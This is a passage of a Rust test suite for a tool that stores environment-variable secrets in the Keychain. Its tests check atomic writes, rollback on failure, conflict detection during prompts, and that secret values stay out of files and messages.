    fn create_like_keychain_failure_midway_rolls_back_and_writes_no_file() {
        let src = "[vars]\nA = \"@keychain\"\nB = \"@keychain\"\n";
        let (dir, cfg) = config_with(&[("src", src)]);
        let store = FailingSet {
            inner: MemoryStore::default(),
            fail_on: "B",
        };
        let prompt = ScriptedPrompter::new()
            .with_secret("a-value")
            .with_secret("b-value");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(create(&ctx, "dst", Some((&cfg, &cfg.load("src").unwrap())), None).is_err());
        assert_eq!(file_names(&dir), vec!["src.toml"]);
        assert!(snap(&store.inner).is_empty());
    }

    #[test]
    fn create_like_file_save_failure_deletes_the_keychain_items_it_wrote() {
        let (dir, cfg) = config_with(&[("src", SOURCE)]);
        // A directory squatting on the target path makes the final rename fail.
        std::fs::create_dir(dir.path().join("dst.toml")).unwrap();
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_secret("new-token");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        // `exists` is false for a directory, so create proceeds to the save.
        assert!(create(&ctx, "dst", Some((&cfg, &cfg.load("src").unwrap())), None).is_err());
        assert!(snap(&store).is_empty());
    }

    /// Answers like its inner prompter, but writes `path` while asking, as a
    /// concurrent `envy <ns> --new` would.
    struct CreatesFileWhilePrompting {
        inner: ScriptedPrompter,
        path: std::path::PathBuf,
    }

    impl Prompter for CreatesFileWhilePrompting {
        fn secret(&self, label: &str) -> Result<Secret> {
            std::fs::write(&self.path, "[vars]\nTHEIRS = \"1\"\n").unwrap();
            self.inner.secret(label)
        }
        fn plain(&self, label: &str, default: Option<&str>) -> Result<String> {
            self.inner.plain(label, default)
        }
        fn confirm(&self, question: &str) -> Result<bool> {
            self.inner.confirm(question)
        }
    }

    /// Answers like its inner prompter, but on every hidden or visible prompt
    /// writes `text` to `path`, as another envy command (or an editor) would
    /// while this one waits for the user.
    struct WritesWhilePrompting {
        inner: ScriptedPrompter,
        path: std::path::PathBuf,
        text: &'static str,
    }

    impl Prompter for WritesWhilePrompting {
        fn secret(&self, label: &str) -> Result<Secret> {
            std::fs::write(&self.path, self.text).unwrap();
            self.inner.secret(label)
        }
        fn plain(&self, label: &str, default: Option<&str>) -> Result<String> {
            std::fs::write(&self.path, self.text).unwrap();
            self.inner.plain(label, default)
        }
        fn confirm(&self, question: &str) -> Result<bool> {
            self.inner.confirm(question)
        }
    }

    #[test]
    fn set_does_not_overwrite_a_file_changed_while_prompting() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nA = \"1\"\n")]);
        let store = MemoryStore::default();
        let theirs = "[vars]\nA = \"1\"\nTHEIRS = \"@keychain\"\n";
        for plain in [false, true] {
            let answers = ScriptedPrompter::new();
            let prompt = WritesWhilePrompting {
                inner: if plain {
                    answers.with_plain("mine")
                } else {
                    answers.with_secret("mine")
                },
                path: dir.path().join("work.toml"),
                text: theirs,
            };
            let ctx = Ctx {
                cfg: &cfg,
                store: &store,
                prompt: &prompt,
            };
            let item = if plain { pl("MINE") } else { sec("MINE") };
            let err = set_vars(&ctx, "work", &[item]).unwrap_err().to_string();
            assert!(
                err.contains("\"work\" was changed while envy was prompting"),
                "{err}"
            );
            assert!(err.contains("nothing was changed"), "{err}");
            assert_eq!(read(&dir, "work"), theirs);
            assert!(snap(&store).is_empty(), "orphaned Keychain item");
            std::fs::write(dir.path().join("work.toml"), "[vars]\nA = \"1\"\n").unwrap();
        }
    }

    #[test]
    fn edit_does_not_overwrite_a_member_changed_while_prompting() {
        let (dir, cfg) = config_with(&[("a", LINKED_A), ("b", LINKED_B)]);
        let store = MemoryStore::default();
        let theirs = "link = \"aws\"\n\n[vars]\nREGION = \"theirs\"\nTOKEN = \"@keychain\"\n";
        let prompt = WritesWhilePrompting {
            inner: ScriptedPrompter::new().with_plain("nb"),
            path: dir.path().join("b.toml"),
            text: theirs,
        };
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        let err = edit(&ctx, "a", &editor(&seen, |t| format!("{t}NEW = \"na\"\n")))
            .unwrap_err()
            .to_string();
        assert!(err.contains("\"b\" was changed while"), "{err}");
        assert_eq!(read(&dir, "a"), LINKED_A);
        assert_eq!(read(&dir, "b"), theirs);
    }

    #[test]
    fn create_does_not_replace_a_namespace_created_while_prompting() {
        let (dir, cfg) = config_with(&[("src", SOURCE)]);
        let store = MemoryStore::default();
        let prompt = CreatesFileWhilePrompting {
            inner: ScriptedPrompter::new().with_secret("new-token"),
            path: dir.path().join("dst.toml"),
        };
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let err = create(&ctx, "dst", Some((&cfg, &cfg.load("src").unwrap())), None)
            .unwrap_err()
            .to_string();
        assert!(err.contains("while envy was prompting"), "{err}");
        assert_eq!(read(&dir, "dst"), "[vars]\nTHEIRS = \"1\"\n");
        assert!(snap(&store).is_empty());
    }

    #[test]
    fn set_defaults_to_secret_and_file_holds_only_the_marker() {
        let (dir, cfg) = config_with(&[("work", "")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_secret("hunter2");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        set_vars(&ctx, "work", &[sec("TOKEN")]).unwrap();
        assert_eq!(snap(&store), vec![entry("work", "TOKEN", "hunter2")]);
        let text = cfg.load("work").unwrap().text();
        assert!(!text.contains("hunter2"));
        assert_eq!(read(&dir, "work"), "[vars]\nTOKEN = \"@keychain\"\n");
    }

    #[test]
    fn set_secret_again_replaces_keychain_value_and_leaves_file() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nTOKEN = \"@keychain\"\n")]);
        let store = MemoryStore::default();
        store
            .set("work", "TOKEN", &Secret::new("old".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new().with_secret("new");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        set_vars(&ctx, "work", &[sec("TOKEN")]).unwrap();
        assert_eq!(snap(&store), vec![entry("work", "TOKEN", "new")]);
        assert_eq!(read(&dir, "work"), "[vars]\nTOKEN = \"@keychain\"\n");
    }

    #[test]
    fn set_plain_prompts_visible_with_current_value_as_default() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nREGION = \"eu-west-1\"\n")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_plain("us-east-1\n");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        set_vars(&ctx, "work", &[pl("REGION")]).unwrap();
        assert_eq!(
            prompt.asked(),
            vec![Asked::Plain {
                label: "Value for REGION in work".into(),
                default: Some("eu-west-1".into())
            }]
        );
        assert_eq!(read(&dir, "work"), "[vars]\nREGION = \"us-east-1\"\n");

        // Empty input keeps the current value.
        let keep = ScriptedPrompter::new().with_plain("\n");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &keep,
        };
        set_vars(&ctx, "work", &[pl("REGION")]).unwrap();
        assert_eq!(read(&dir, "work"), "[vars]\nREGION = \"us-east-1\"\n");
        assert!(snap(&store).is_empty());
    }

    #[test]
    fn set_plain_keeps_awkward_characters_intact() {
        let (_dir, cfg) = config_with(&[("work", "")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_plain("it's \"a\" b\\c  \n");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        set_vars(&ctx, "work", &[pl("MSG")]).unwrap();
        assert_eq!(
            cfg.load("work").unwrap().get("MSG"),
            Some(Value::Plain("it's \"a\" b\\c  ".into()))
        );
    }

    #[test]
    fn set_plain_marker_value_is_rejected_before_any_keychain_change() {
        let before = "[vars]\nTOKEN = \"@keychain\"\n";
        let (dir, cfg) = config_with(&[("work", before)]);
        let store = MemoryStore::default();
        store
            .set("work", "TOKEN", &Secret::new("keep-me".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_plain("@keychain");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let err = set_vars(&ctx, "work", &[pl("TOKEN")])
            .unwrap_err()
            .to_string();
        assert!(err.contains("reserved"), "{err}");
        assert_eq!(read(&dir, "work"), before);
        assert_eq!(snap(&store), vec![entry("work", "TOKEN", "keep-me")]);
    }

    #[test]
    fn set_plain_nul_value_is_rejected() {
        let (dir, cfg) = config_with(&[("work", "")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_plain("a\0b");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(set_vars(&ctx, "work", &[pl("X")]).is_err());
        assert_eq!(read(&dir, "work"), "");
    }

    #[test]
    fn set_converts_secret_to_plain_after_confirm_and_deletes_keychain_item() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nTOKEN = \"@keychain\"\n")]);
        let store = MemoryStore::default();
        store
            .set("work", "TOKEN", &Secret::new("hunter2".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_plain("visible");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        set_vars(&ctx, "work", &[pl("TOKEN")]).unwrap();
        assert_eq!(read(&dir, "work"), "[vars]\nTOKEN = \"visible\"\n");
        assert!(snap(&store).is_empty());
        // The confirmation came first, and the plain prompt had no default.
        assert!(matches!(prompt.asked()[0], Asked::Confirm(_)));
        assert_eq!(
            prompt.asked()[1],
            Asked::Plain {
                label: "Value for TOKEN in work".into(),
                default: None
            }
        );
    }

    #[test]
    fn set_converts_plain_to_secret_after_confirm() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nTOKEN = \"plain\"\n")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_secret("hunter2");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        set_vars(&ctx, "work", &[sec("TOKEN")]).unwrap();
        assert_eq!(read(&dir, "work"), "[vars]\nTOKEN = \"@keychain\"\n");
        assert_eq!(snap(&store), vec![entry("work", "TOKEN", "hunter2")]);
    }

    #[test]
    fn declined_conversion_changes_nothing() {
        let secret_file = "[vars]\nTOKEN = \"@keychain\"\n";
        let plain_file = "[vars]\nTOKEN = \"plain\"\n";
        for (text, make_plain) in [(secret_file, true), (plain_file, false)] {
            let (dir, cfg) = config_with(&[("work", text)]);
            let store = MemoryStore::default();
            if text == secret_file {
                store
                    .set("work", "TOKEN", &Secret::new("hunter2".into()))
                    .unwrap();
            }
            let before = snap(&store);
            let prompt = ScriptedPrompter::new().with_confirm(false);
            let ctx = Ctx {
                cfg: &cfg,
                store: &store,
                prompt: &prompt,
            };
            let item = if make_plain {
                pl("TOKEN")
            } else {
                sec("TOKEN")
            };
            assert!(set_vars(&ctx, "work", &[item]).is_err());
            assert_eq!(read(&dir, "work"), text);
            assert_eq!(snap(&store), before);
            assert_eq!(prompt.asked().len(), 1);
        }
    }

    #[test]
    fn empty_secret_is_rejected_and_nothing_is_written() {
        let (dir, cfg) = config_with(&[("work", "")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_secret("");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(set_vars(&ctx, "work", &[sec("TOKEN")]).is_err());
        assert_eq!(read(&dir, "work"), "");
        assert!(snap(&store).is_empty());
    }

    /// A store that, once an item is written, puts a non-empty directory
    /// where `path` was (keeping the file's text aside), so the save that
    /// follows fails. This runs inside `apply`, after every prompt and check.
    struct SquatOnSet {
        inner: MemoryStore,
        path: std::path::PathBuf,
        kept: std::cell::RefCell<Option<String>>,
    }

    impl SecretStore for SquatOnSet {
        fn get(&self, ns: &str, name: &str) -> Result<Option<Secret>> {
            self.inner.get(ns, name)
        }
        fn contains(&self, ns: &str, name: &str) -> Result<bool> {
            self.inner.contains(ns, name)
        }
        fn set(&self, ns: &str, name: &str, value: &Secret) -> Result<()> {
            self.inner.set(ns, name, value)?;
            if self.path.is_file() {
                *self.kept.borrow_mut() = Some(std::fs::read_to_string(&self.path).unwrap());
                std::fs::remove_file(&self.path).unwrap();
                std::fs::create_dir(&self.path).unwrap();
                std::fs::write(self.path.join("keep"), "").unwrap();
            }
            Ok(())
        }
        fn delete(&self, ns: &str, name: &str) -> Result<()> {
            self.inner.delete(ns, name)
        }
    }

    #[test]
    fn set_secret_file_save_failure_restores_the_keychain() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nTOKEN = \"@keychain\"\n")]);
        let store = SquatOnSet {
            inner: MemoryStore::default(),
            path: dir.path().join("work.toml"),
            kept: Default::default(),
        };
        store
            .inner
            .set("work", "TOKEN", &Secret::new("stale".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new().with_secret("fresh");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let err = set_vars(&ctx, "work", &[sec("TOKEN")]).unwrap_err();
        assert!(
            format!("{err:#}").contains("cannot write namespace \"work\""),
            "{err:#}"
        );
        assert!(!format!("{err:#}").contains("fresh"), "{err:#}");
        // The squat really happened, and the prior value is back.
        assert!(dir.path().join("work.toml").is_dir());
        assert_eq!(
            store.kept.borrow().as_deref(),
            Some("[vars]\nTOKEN = \"@keychain\"\n")
        );
        assert_eq!(snap(&store.inner), vec![entry("work", "TOKEN", "stale")]);
    }

    #[test]
    fn set_on_unknown_namespace_errors_without_prompting() {
        let (dir, cfg) = config_with(&[]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_secret("hunter2");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let err = set_vars(&ctx, "nope", &[sec("TOKEN")])
            .unwrap_err()
            .to_string();
        assert!(err.contains("nope") && err.contains("--new"), "{err}");
        assert!(file_names(&dir).is_empty());
        assert!(snap(&store).is_empty());
        assert_eq!(prompt.remaining(), 1);
    }

    #[test]
    fn set_rejects_invalid_names_before_any_access() {
        let (dir, cfg) = config_with(&[("work", "")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_secret("hunter2");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(set_vars(&ctx, "work", &[sec("bad-name")]).is_err());
        assert!(set_vars(&ctx, "../x", &[sec("OK")]).is_err());
        // A bad name later in the list stops everything before any prompt.
        assert!(set_vars(&ctx, "work", &[sec("OK"), pv("ENVY_VARS", "x")]).is_err());
        assert_eq!(prompt.remaining(), 1);
        assert!(snap(&store).is_empty());
        assert_eq!(read(&dir, "work"), "");
    }

    // ---- set_vars: several items in one command ----

    fn ctx_for<'a>(
        cfg: &'a Config,
        store: &'a dyn SecretStore,
        prompt: &'a dyn Prompter,
    ) -> Ctx<'a> {
        Ctx { cfg, store, prompt }
    }

    #[test]
    fn set_vars_several_secrets_prompt_in_order_and_store_only_markers() {
        let (dir, cfg) = config_with(&[("work", "")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new()
            .with_secret("zq-gh")
            .with_secret("zq-oa")
            .with_secret("zq-np");
        set_vars(
            &ctx_for(&cfg, &store, &prompt),
            "work",
            &[sec("GITHUB_TOKEN"), sec("OPENAI_KEY"), sec("NPM_TOKEN")],
        )
        .unwrap();
        assert_eq!(
            prompt.asked(),
            vec![
                Asked::Secret("Secret value for GITHUB_TOKEN in work".into()),
                Asked::Secret("Secret value for OPENAI_KEY in work".into()),
                Asked::Secret("Secret value for NPM_TOKEN in work".into()),
            ]
        );
        assert_eq!(
            read(&dir, "work"),
            "[vars]\nGITHUB_TOKEN = \"@keychain\"\nOPENAI_KEY = \"@keychain\"\nNPM_TOKEN = \"@keychain\"\n"
        );
        assert_eq!(
            snap(&store),
            vec![
                entry("work", "GITHUB_TOKEN", "zq-gh"),
                entry("work", "NPM_TOKEN", "zq-np"),
                entry("work", "OPENAI_KEY", "zq-oa"),
            ]
        );
    }

    #[test]
    fn set_vars_mixed_kinds_prompt_in_the_given_order() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nREGION = \"eu\"\n")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new()
            .with_plain("us\n")
            .with_secret("zq-tok");
        set_vars(
            &ctx_for(&cfg, &store, &prompt),
            "work",
            &[pl("REGION"), sec("TOKEN"), pv("PROFILE", "dev")],
        )
        .unwrap();
        assert_eq!(
            prompt.asked(),
            vec![
                Asked::Plain {
                    label: "Value for REGION in work".into(),
                    default: Some("eu".into())
                },
                Asked::Secret("Secret value for TOKEN in work".into()),
            ]
        );
        assert_eq!(
            read(&dir, "work"),
            "[vars]\nREGION = \"us\"\nTOKEN = \"@keychain\"\nPROFILE = \"dev\"\n"
        );
        assert_eq!(snap(&store), vec![entry("work", "TOKEN", "zq-tok")]);
    }

    #[test]
    fn set_vars_inline_plain_values_need_no_prompt() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nA = \"old\"\n")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        set_vars(
            &ctx_for(&cfg, &store, &prompt),
            "work",
            &[pv("A", "1"), pv("EMPTY", ""), pv("URL", "a=b=c")],
        )
        .unwrap();
        assert!(prompt.asked().is_empty());
        assert_eq!(
            read(&dir, "work"),
            "[vars]\nA = \"1\"\nEMPTY = \"\"\nURL = \"a=b=c\"\n"
        );
        assert_eq!(
            cfg.load("work").unwrap().get("EMPTY"),
            Some(Value::Plain(String::new()))
        );
        assert!(snap(&store).is_empty());
    }

    #[test]
    fn set_vars_conversions_confirm_each_then_write_once() {
        let before = "[vars]\nTOKEN = \"@keychain\"\nREGION = \"eu\"\n";
        let (dir, cfg) = config_with(&[("work", before)]);
        let store = MemoryStore::default();
        store
            .set("work", "TOKEN", &Secret::new("zq-old".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_confirm(true)
            .with_secret("zq-region");
        set_vars(
            &ctx_for(&cfg, &store, &prompt),
            "work",
            &[pv("TOKEN", "visible"), sec("REGION")],
        )
        .unwrap();
        assert_eq!(
            prompt.asked(),
            vec![
                Asked::Confirm(
                    "TOKEN is currently a secret. Replace it with a plain value (the Keychain item will be deleted)?"
                        .into()
                ),
                Asked::Confirm(
                    "REGION is currently a plain value. Replace it with a secret?".into()
                ),
                Asked::Secret("Secret value for REGION in work".into()),
            ]
        );
        assert_eq!(
            read(&dir, "work"),
            "[vars]\nTOKEN = \"visible\"\nREGION = \"@keychain\"\n"
        );
        assert_eq!(snap(&store), vec![entry("work", "REGION", "zq-region")]);
    }

    #[test]
    fn set_vars_declined_last_confirm_changes_nothing() {
        let before = "[vars]\nTOKEN = \"@keychain\"\n";
        let (dir, cfg) = config_with(&[("work", before)]);
        let store = MemoryStore::default();
        store
            .set("work", "TOKEN", &Secret::new("zq-keep".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new()
            .with_secret("zq-new")
            .with_confirm(false);
        let err = set_vars(
            &ctx_for(&cfg, &store, &prompt),
            "work",
            &[sec("NEW"), pv("A", "1"), pl("TOKEN")],
        )
        .unwrap_err()
        .to_string();
        assert!(
            err.contains("cancelled") && err.contains("nothing was changed"),
            "{err}"
        );
        assert_eq!(prompt.asked().len(), 2, "{:?}", prompt.asked());
        assert_eq!(read(&dir, "work"), before);
        assert_eq!(file_names(&dir), ["work.toml"]);
        assert_eq!(snap(&store), vec![entry("work", "TOKEN", "zq-keep")]);
    }

    #[test]
    fn set_vars_failed_or_missing_later_prompt_writes_nothing() {
        let before = "[vars]\nOLD = \"@keychain\"\n";
        // The second item's prompt fails (empty secret), or the prompter
        // runs out of answers on the last one.
        for prompt in [
            ScriptedPrompter::new()
                .with_secret("zq-a")
                .with_secret("")
                .with_plain("c"),
            ScriptedPrompter::new()
                .with_secret("zq-a")
                .with_secret("zq-b"),
        ] {
            let (dir, cfg) = config_with(&[("work", before)]);
            let store = MemoryStore::default();
            store
                .set("work", "OLD", &Secret::new("zq-old".into()))
                .unwrap();
            let err = set_vars(
                &ctx_for(&cfg, &store, &prompt),
                "work",
                &[sec("A"), sec("OLD"), pl("C")],
            )
            .unwrap_err();
            assert!(!format!("{err:#}").contains("zq-"), "{err:#}");
            assert_eq!(read(&dir, "work"), before);
            assert_eq!(file_names(&dir), ["work.toml"]);
            assert_eq!(snap(&store), vec![entry("work", "OLD", "zq-old")]);
        }
    }

    #[test]
    fn set_vars_cancelled_plain_prompt_says_nothing_was_changed() {
        let (dir, cfg) = config_with(&[("work", "")]);
        let store = MemoryStore::default();
        // No answer for B's visible prompt (as when it is cancelled).
        let prompt = ScriptedPrompter::new().with_plain("1");
        let err =
            set_vars(&ctx_for(&cfg, &store, &prompt), "work", &[pl("A"), pl("B")]).unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.starts_with("no value for B; nothing was changed"),
            "{msg}"
        );
        assert_eq!(read(&dir, "work"), "");
    }

    #[test]
    fn set_vars_inline_values_are_checked_before_any_prompt() {
        for bad in ["@keychain", "a\0b"] {
            let before = "[vars]\nB = \"@keychain\"\n";
            let (dir, cfg) = config_with(&[("work", before)]);
            let store = MemoryStore::default();
            store
                .set("work", "B", &Secret::new("zq-keep".into()))
                .unwrap();
            let prompt = ScriptedPrompter::new()
                .with_secret("zq-a")
                .with_confirm(true);
            let err = set_vars(
                &ctx_for(&cfg, &store, &prompt),
                "work",
                &[sec("A"), pv("B", bad)],
            )
            .unwrap_err()
            .to_string();
            assert!(err.contains("B"), "{err}");
            assert!(prompt.asked().is_empty(), "{:?}", prompt.asked());
            assert_eq!(read(&dir, "work"), before);
            assert_eq!(snap(&store), vec![entry("work", "B", "zq-keep")]);
        }
    }

    #[test]
    fn set_vars_rejects_duplicates_and_an_empty_list_before_any_prompt() {
        let (dir, cfg) = config_with(&[("work", "")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_secret("zq-a");
        let ctx = ctx_for(&cfg, &store, &prompt);
        let err = set_vars(&ctx, "work", &[sec("A"), pv("A", "1")])
            .unwrap_err()
            .to_string();
        assert!(err.contains("A") && err.contains("more than once"), "{err}");
        assert!(set_vars(&ctx, "work", &[]).is_err());
        assert!(prompt.asked().is_empty());
        assert_eq!(read(&dir, "work"), "");
        assert!(snap(&store).is_empty());
    }

    #[test]
    fn set_vars_save_failure_restores_overwritten_and_new_secrets() {
        let before = "[vars]\nTOKEN = \"@keychain\"\n";
        let (dir, cfg) = config_with(&[("work", before)]);
        let store = SquatOnSet {
            inner: MemoryStore::default(),
            path: dir.path().join("work.toml"),
            kept: Default::default(),
        };
        store
            .inner
            .set("work", "TOKEN", &Secret::new("zq-stale".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new()
            .with_secret("zq-fresh")
            .with_secret("zq-new");
        let err = set_vars(
            &ctx_for(&cfg, &store, &prompt),
            "work",
            &[sec("TOKEN"), sec("NEW"), pv("P", "x")],
        )
        .unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("cannot write namespace \"work\""), "{msg}");
        assert!(!msg.contains("zq-"), "{msg}");
        // The squat really happened (after every prompt), and the Keychain
        // is exactly as before: TOKEN's prior value back, NEW gone.
        assert!(dir.path().join("work.toml").is_dir());
        assert_eq!(store.kept.borrow().as_deref(), Some(before));
        assert_eq!(prompt.remaining(), 0);
        assert_eq!(snap(&store.inner), vec![entry("work", "TOKEN", "zq-stale")]);
    }

    /// Answers like its inner prompter; on the first hidden or visible prompt
    /// only, writes `text` to `path`, as another envy command would.
    struct WritesOnFirstPrompt {
        inner: ScriptedPrompter,
        path: std::path::PathBuf,
        text: &'static str,
        done: std::cell::Cell<bool>,
    }

    impl WritesOnFirstPrompt {
        fn touch(&self) {
            if !self.done.replace(true) {
                std::fs::write(&self.path, self.text).unwrap();
            }
        }
    }

    impl Prompter for WritesOnFirstPrompt {
        fn secret(&self, label: &str) -> Result<Secret> {
            self.touch();
            self.inner.secret(label)
        }
        fn plain(&self, label: &str, default: Option<&str>) -> Result<String> {
            self.touch();
            self.inner.plain(label, default)
        }
        fn confirm(&self, question: &str) -> Result<bool> {
            self.inner.confirm(question)
        }
    }

    #[test]
    fn set_vars_rechecks_the_file_after_all_prompts() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nA = \"1\"\n")]);
        let store = MemoryStore::default();
        let theirs = "[vars]\nA = \"1\"\nTHEIRS = \"x\"\n";
        let prompt = WritesOnFirstPrompt {
            inner: ScriptedPrompter::new()
                .with_secret("zq-x")
                .with_plain("y")
                .with_secret("zq-z"),
            path: dir.path().join("work.toml"),
            text: theirs,
            done: Default::default(),
        };
        let err = set_vars(
            &ctx_for(&cfg, &store, &prompt),
            "work",
            &[sec("X"), pl("Y"), sec("Z")],
        )
        .unwrap_err()
        .to_string();
        assert!(
            err.contains("\"work\" was changed while envy was prompting")
                && err.contains("nothing was changed"),
            "{err}"
        );
        // Every prompt was still asked first: one check, before the write.
        assert_eq!(prompt.inner.remaining(), 0);
        assert_eq!(read(&dir, "work"), theirs);
        assert!(snap(&store).is_empty(), "orphaned Keychain item");
    }

    #[test]
    fn remove_deletes_file_and_keychain_items_after_confirm() {
        let (dir, cfg) = config_with(&[
            (
                "work",
                "[vars]\nA = \"x\"\nT1 = \"@keychain\"\nT2 = \"@keychain\"\n",
            ),
            ("other", "[vars]\nT1 = \"@keychain\"\n"),
        ]);
        let store = MemoryStore::default();
        store.set("work", "T1", &Secret::new("one".into())).unwrap();
        // T2 is already absent from the Keychain: still fine.
        store
            .set("other", "T1", &Secret::new("keep".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new().with_confirm(true);
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(remove(&ctx, "work").unwrap().is_empty());
        assert_eq!(file_names(&dir), vec!["other.toml"]);
        assert_eq!(snap(&store), vec![entry("other", "T1", "keep")]);
    }

    #[test]
    fn remove_declined_changes_nothing() {
        let text = "[vars]\nT1 = \"@keychain\"\n";
        let (dir, cfg) = config_with(&[("work", text)]);
        let store = MemoryStore::default();
        store.set("work", "T1", &Secret::new("one".into())).unwrap();
        let prompt = ScriptedPrompter::new().with_confirm(false);
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(remove(&ctx, "work").is_err());
        assert_eq!(read(&dir, "work"), text);
        assert_eq!(snap(&store), vec![entry("work", "T1", "one")]);
    }

    #[test]
    fn remove_unknown_namespace_errors_without_prompting() {
        let (_dir, cfg) = config_with(&[]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_confirm(true);
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(remove(&ctx, "nope").is_err());
        assert_eq!(prompt.remaining(), 1);
    }

    #[test]
    fn remove_question_names_secrets_but_never_values() {
        let (_dir, cfg) =
            config_with(&[("work", "[vars]\nA = \"plain-val\"\nT1 = \"@keychain\"\n")]);
        let store = MemoryStore::default();
        store
            .set("work", "T1", &Secret::new("hunter2".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new().with_confirm(true);
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        remove(&ctx, "work").unwrap();
        let Asked::Confirm(q) = &prompt.asked()[0] else {
            panic!()
        };
        assert!(
            q.contains("T1") && !q.contains("hunter2") && !q.contains("plain-val"),
            "{q}"
        );
    }

    // ---- edit ----

    use std::cell::RefCell;
    use std::os::unix::fs::MetadataExt;
    use std::path::PathBuf;

    /// What the fake editor saw of the temp copy.
    #[derive(Default)]
    struct Seen {
        path: Option<PathBuf>,
        text: String,
        file_mode: u32,
        dir_mode: u32,
    }

    /// A fake editor that records what it was given and then replaces the
    /// copy's text with `edit(old text)`.
    fn editor<'a>(
        seen: &'a RefCell<Seen>,
        edit: impl Fn(&str) -> String + 'a,
    ) -> impl Fn(&Path) -> Result<()> + 'a {
        move |path: &Path| {
            let text = std::fs::read_to_string(path)?;
            let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;
            *seen.borrow_mut() = Seen {
                path: Some(path.to_path_buf()),
                text: text.clone(),
                file_mode: mode(path),
                dir_mode: mode(path.parent().unwrap()),
            };
            std::fs::write(path, edit(&text))?;
            Ok(())
        }
    }

    /// The fake editor ran on a private copy of `original`, which is gone now.
    fn assert_private_copy_removed(seen: &RefCell<Seen>, original: &str) {
        let seen = seen.borrow();
        let path = seen.path.as_ref().expect("the editor ran");
        assert_eq!(seen.text, original);
        assert_eq!(seen.file_mode, 0o600);
        assert_eq!(seen.dir_mode, 0o700);
        assert!(!path.exists(), "{path:?} left behind");
        assert!(!path.parent().unwrap().exists(), "temp dir left behind");
    }

    fn never_runs(_: &Path) -> Result<()> {
        panic!("the editor must not run")
    }

    #[test]
    fn edit_adds_secret_line_and_prompts_hidden_value() {
        let before = "# mine\n[vars]\nREGION = \"eu\" # where\n";
        let (dir, cfg) = config_with(&[("work", before)]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_secret("s3cret");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        edit(
            &ctx,
            "work",
            &editor(&seen, |t| format!("{t}TOKEN = \"@keychain\" # new\n")),
        )
        .unwrap();
        assert_private_copy_removed(&seen, before);
        assert_eq!(
            read(&dir, "work"),
            "# mine\n[vars]\nREGION = \"eu\" # where\nTOKEN = \"@keychain\" # new\n"
        );
        assert_eq!(
            prompt.asked(),
            vec![Asked::Secret("Secret value for TOKEN in work".into())]
        );
